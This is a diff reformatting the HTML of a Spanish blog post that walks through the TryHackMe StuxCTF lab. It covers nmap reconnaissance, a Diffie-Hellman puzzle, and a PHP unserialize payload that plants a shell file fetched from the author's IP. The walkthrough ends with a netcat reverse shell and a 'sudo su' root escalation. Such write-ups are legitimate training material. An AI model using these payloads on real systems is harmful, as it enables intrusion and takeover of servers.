@@ -1,92 +1,17 @@
-<!doctype html><html lang=es>
-<head>
-<title>
-StuxCTF - Write Up - Español ::
-Lanfran02 - Blog — Hackeando tu forma de aprender.
-</title><meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="Link Nivel Creador     Aquí Medio stuxnet    Reconocimiento Empezemos con nuestro mejor amigo nmap
-└──╼ $map stuxctf.thm [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 17:18 CEST Nmap scan report for stuxctf.thm Host is up (0.064s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e8:da:b7:0d:a7:a1:cc:8e:ac:4b:19:6d:25:2b:3e:77 (RSA) | 256 c1:0c:5a:db:6c:d6:a3:15:96:85:21:e9:48:65:28:42 (ECDSA) |_ 256 0f:1a:6a:d1:bb:cb:a6:3e:bd:8f:99:8d:da:2f:30:86 (ED25519) 80/tcp open http Apache httpd 2.">
-<meta name=keywords content="CTF,Writeup,Hacking">
-<meta name=robots content="noodp">
-<link rel=canonical href=/es/posts/stuxctf/>
-<link rel=stylesheet href=/assets/style.css>
-<link rel=stylesheet href=/style.css>
-<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
-<link rel="shortcut icon" href=/img/favicon.png>
-<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<meta name=twitter:card content="summary_large_image">
-<meta name=twitter:image content="/es/posts/stuxctf/cover.png">
-<meta name=twitter:title content="StuxCTF - Write Up - Español">
-<meta name=twitter:description content="Máquina de nivel medio en TryHackMe.">
-<meta property="og:title" content="StuxCTF - Write Up - Español">
-<meta property="og:description" content="Máquina de nivel medio en TryHackMe.">
-<meta property="og:type" content="article">
-<meta property="og:url" content="/es/posts/stuxctf/"><meta property="og:image" content="/es/posts/stuxctf/cover.png"><meta property="article:section" content="posts">
-<meta property="article:published_time" content="2021-07-06T12:52:17+02:00">
-<meta property="article:modified_time" content="2021-07-06T12:52:17+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
+<!doctype html><html lang=es><head><title>StuxCTF - Write Up - Español ::
+Lanfran02 - Blog — Hackeando tu forma de aprender.</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Link Nivel Creador     Aquí Medio stuxnet    Reconocimiento Empezemos con nuestro mejor amigo nmap
+└──╼ $map stuxctf.thm [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 17:18 CEST Nmap scan report for stuxctf.thm Host is up (0.064s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e8:da:b7:0d:a7:a1:cc:8e:ac:4b:19:6d:25:2b:3e:77 (RSA) | 256 c1:0c:5a:db:6c:d6:a3:15:96:85:21:e9:48:65:28:42 (ECDSA) |_ 256 0f:1a:6a:d1:bb:cb:a6:3e:bd:8f:99:8d:da:2f:30:86 (ED25519) 80/tcp open http Apache httpd 2."><meta name=keywords content="CTF,Writeup,Hacking"><meta name=robots content="noodp"><link rel=canonical href=/es/posts/stuxctf/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/style.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=/img/favicon.png><link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin><link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/es/posts/stuxctf/cover.png"><meta name=twitter:title content="StuxCTF - Write Up - Español"><meta name=twitter:description content="Máquina de nivel medio en TryHackMe."><meta property="og:title" content="StuxCTF - Write Up - Español"><meta property="og:description" content="Máquina de nivel medio en TryHackMe."><meta property="og:type" content="article"><meta property="og:url" content="/es/posts/stuxctf/"><meta property="og:image" content="/es/posts/stuxctf/cover.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-07-06T12:52:17+02:00"><meta property="article:modified_time" content="2021-07-06T12:52:17+02:00"><meta property="og:site_name" content="Lanfran02 - Blog"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
-<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script>
-<script async src=https://www.google-analytics.com/analytics.js></script>
-</head><body class=dark-theme>
-<div class=container>
-<header class=header>
-<span class=header__inner>
-<a href=/es/ class=logo style=text-decoration:none>
-<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
-</span>
-<span class=logo__text>Lanfran02</span>
-<span class=logo__cursor></span>
-</a>
-<span class=header__right>
-<nav class=menu>
-<ul class="menu__inner menu__inner--desktop">
-<li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner>
-<li class=menu__sub-inner-more-trigger>
-Write Ups
-<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
-</span>
-</li><ul class="menu__sub-inner-more hidden">
-<li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile">
-<li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span>
-<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
-</span>
-</span>
-</span>
-</header><div class=content>
-<div class=post>
-<h1 class=post-title>StuxCTF - Write Up - Español</h1><div class=post-meta>
-<span class=post-date>
-2021-07-06
-</span>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/es/ class=logo style=text-decoration:none><span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span><span class=logo__text>Lanfran02</span>
+<span class=logo__cursor></span></a>
+<span class=header__right><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Write Ups
+<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg></span></li><ul class="menu__sub-inner-more hidden"><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/es/about>Acerca de mí</a></li><li><a href=/>English</a></li><li><a href=/es/tags/hackthebox/>HTB</a></li><li><a href=/es/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><div class=post><h1 class=post-title>StuxCTF - Write Up - Español</h1><div class=post-meta><span class=post-date>2021-07-06</span>
 <span class=post-author>— Escrito por Lanfran02</span>
-<span class=post-read-time>— 6 mins lectura</span>
-</div><span class=post-tags>
-<a href=/tags/nc/>#nc</a>&nbsp;
+<span class=post-read-time>— 6 mins lectura</span></div><span class=post-tags><a href=/tags/nc/>#nc</a>&nbsp;
 <a href=/tags/unserialize/>#unserialize</a>&nbsp;
 <a href=/tags/crypto/>#crypto</a>&nbsp;
 <a href=/tags/sudo/>#sudo</a>&nbsp;
-<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
-</span>
-<figure class=post-cover>
-<img src=/es/posts/stuxctf/cover.png alt="StuxCTF - Write Up - Español">
-</figure><div class=post-content>
-<h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents>
-<ul>
-<li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table>
-<thead>
-<tr>
-<th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody>
-<tr>
-<td><a href=https://tryhackme.com/room/stuxctf>Aquí</a></td><td>Medio</td><td><a href=https://tryhackme.com/p/stuxnet>stuxnet</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>Empezemos con nuestro mejor amigo <code>nmap</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $map stuxctf.thm
+<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;</span><figure class=post-cover><img src=/es/posts/stuxctf/cover.png alt="StuxCTF - Write Up - Español"></figure><div class=post-content><h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents><ul><li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table><thead><tr><th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody><tr><td><a href=https://tryhackme.com/room/stuxctf>Aquí</a></td><td>Medio</td><td><a href=https://tryhackme.com/p/stuxnet>stuxnet</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>Empezemos con nuestro mejor amigo <code>nmap</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└──╼ $map stuxctf.thm
 </span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
 </span></span><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-06-16 17:18 CEST
 </span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> stuxctf.thm
@@ -139,8 +64,7 @@ Español
 Pista: g ^ a mod p, g ^ b mod p, g ^ C mod p
 
 Los primero 128 caracteres.
-</code></pre><p>Entonces, buscando en Google &ldquo;g^a mod p, g^b mod p, g^c mod p&rdquo;,encontramos 2 cosas:</p><ul>
-<li>El creador de esta sala está utilizando un cifrado Diffie-Hellman.</li><li><a href=https://razzk.net/posts/Crypto-300_1/>Un writeup de un laboratorio &ldquo;QIWI - Crypto 300_1&rdquo;, con un código en Python para descifrar el mensaje.</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env sage -python</span>
+</code></pre><p>Entonces, buscando en Google &ldquo;g^a mod p, g^b mod p, g^c mod p&rdquo;,encontramos 2 cosas:</p><ul><li>El creador de esta sala está utilizando un cifrado Diffie-Hellman.</li><li><a href=https://razzk.net/posts/Crypto-300_1/>Un writeup de un laboratorio &ldquo;QIWI - Crypto 300_1&rdquo;, con un código en Python para descifrar el mensaje.</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env sage -python</span>
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>p<span style=color:#f92672>=</span>XXXXXXX
 </span></span><span style=display:flex><span>g<span style=color:#f92672>=</span>X
@@ -272,8 +196,7 @@ Y tambien una pista oculta: <code>&lt;!-- hint: /?file= --></code></p><p>Entonce
 </span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;assets/js/bootstrap.min.js&#34;</span><span style=color:#f92672>&gt;&lt;/</span><span style=color:#a6e22e>script</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
 </span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>body</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
 </span></span><span style=display:flex><span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;&lt;</span><span style=color:#a6e22e>br</span> <span style=color:#f92672>/&gt;</span>
-</span></span></code></pre></div><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>Analizando el código, podemos obtener información valiosa:</p><ul>
-<li>Una parte del código está creando una <code>clase</code></li><li>La descripción de la sala dice: <em>&ldquo;Crypto, <strong>serealization</strong>, priv scalation and more &mldr;&rdquo;</em> Dándonos una pista, tal vez podamos obtener la ejecución remota de código a través de la deserialización insegura en PHP.</li></ul><p>Para ello, busqué información en Google y encontré una página que explica cómo hacerlo. <a href=https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/>Aquí está el enlace</a>.</p><p>Entonces, con este fragmento de código, ¡podemos obtener RCE!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span></code></pre></div><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>Analizando el código, podemos obtener información valiosa:</p><ul><li>Una parte del código está creando una <code>clase</code></li><li>La descripción de la sala dice: <em>&ldquo;Crypto, <strong>serealization</strong>, priv scalation and more &mldr;&rdquo;</em> Dándonos una pista, tal vez podamos obtener la ejecución remota de código a través de la deserialización insegura en PHP.</li></ul><p>Para ello, busqué información en Google y encontré una página que explica cómo hacerlo. <a href=https://www.sjoerdlangkemper.nl/2021/04/04/remote-code-execution-through-unsafe-unserialize/>Aquí está el enlace</a>.</p><p>Entonces, con este fragmento de código, ¡podemos obtener RCE!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>file</span> 
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> $file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;this_is_totally_not_a_shell.php&#39;</span>;
@@ -283,15 +206,11 @@ Y tambien una pista oculta: <code>&lt;!-- hint: /?file= --></code></p><p>Entonce
 </span></span><span style=display:flex><span>$exploit <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>(<span style=color:#66d9ef>new</span> <span style=color:#a6e22e>file</span>);
 </span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> $exploit;
 </span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
-</span></span></span></code></pre></div><p>Entonces esto es lo que vamos a hacer:</p><ul>
-<li>Ejecutar el archivo php y guardar el código en un archivo <code>.txt</code>.</li><li>Ir a la carpeta donde se encuentra el archivo <code>.txt</code> en nuestra máquina local y cree un servidor web simple con python <code>sudo python3 -m http.server 80</code>.</li><li>Ir a la página, y en el parámetro <code>file</code> vamos a poner nuestra IP del <code>tun0</code> y el nombre del archivo .txt.</li><li>Ejecutar <code>netcat</code> para capturar la shell reversa.</li><li>Finalmente vaya al archivo <code>this_is_totally_not_a_shell.php</code>.</li></ul><ol>
-<li></li><li></li><li>
-</li></ol><p>[&mldr;]</p><pre tabindex=0><code>4.
+</span></span></span></code></pre></div><p>Entonces esto es lo que vamos a hacer:</p><ul><li>Ejecutar el archivo php y guardar el código en un archivo <code>.txt</code>.</li><li>Ir a la carpeta donde se encuentra el archivo <code>.txt</code> en nuestra máquina local y cree un servidor web simple con python <code>sudo python3 -m http.server 80</code>.</li><li>Ir a la página, y en el parámetro <code>file</code> vamos a poner nuestra IP del <code>tun0</code> y el nombre del archivo .txt.</li><li>Ejecutar <code>netcat</code> para capturar la shell reversa.</li><li>Finalmente vaya al archivo <code>this_is_totally_not_a_shell.php</code>.</li></ul><ol><li></li><li></li><li></li></ol><p>[&mldr;]</p><pre tabindex=0><code>4.
 ```bash
 ╰─ lanfran@parrot ❯ nc -nlvp 1337                                                                                                  ─╯
 listening on [any] 1337 ...
-</code></pre><ol start=5>
-<li></li></ol><p>Finalmente Beneficio.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
+</code></pre><ol start=5><li></li></ol><p>Finalmente Beneficio.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
 </span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
 </span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.9.2.251<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.250.63<span style=color:#f92672>]</span> <span style=color:#ae81ff>57118</span>
 </span></span><span style=display:flex><span>/bin/sh: 0: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
@@ -310,32 +229,11 @@ listening on [any] 1337 ...
 </span></span></code></pre></div><p>¡WOW!</p><p>Podemos escalar a root simplemente ejecutando <code>sudo su</code> !!!!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@ubuntu:/home/grecia$ sudo su
 </span></span><span style=display:flex><span>root@ubuntu:/home/grecia# cat /root/root.txt 
 </span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>
-</span></span></code></pre></div><p>¡Y hemos rooteado la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h>Leer otros posts</span>
-<hr>
-</div><div class=pagination__buttons>
-<span class="button previous">
-<a href=/es/posts/thm-pre-security/>
-<span class=button__icon>←</span>
-<span class=button__text>Hackea Tu Forma De Aprender - THM</span>
-</a>
-</span>
-<span class="button next">
-<a href=/es/posts/develpy/>
-<span class=button__text>Develpy - Write Up - Español</span>
-<span class=button__icon>→</span>
-</a>
-</span>
-</div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
-<script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
-</div></div><footer class=footer>
-<div class=footer__inner>
-<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
+</span></span></code></pre></div><p>¡Y hemos rooteado la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Leer otros posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=/es/posts/thm-pre-security/><span class=button__icon>←</span>
+<span class=button__text>Hackea Tu Forma De Aprender - THM</span></a></span>
+<span class="button next"><a href=/es/posts/develpy/><span class=button__text>Develpy - Write Up - Español</span>
+<span class=button__icon>→</span></a></span></div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script><script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
 <script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
-<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
-<script type=module src=/assets/ionicons/ionicons.esm.js></script>
-<script nomodule src=/assets/ionicons/ionicons.js></script>
-</div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
-<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
-</body></html>
+<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script><script type=module src=/assets/ionicons/ionicons.esm.js></script>
+<script nomodule src=/assets/ionicons/ionicons.js></script></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script></body></html>
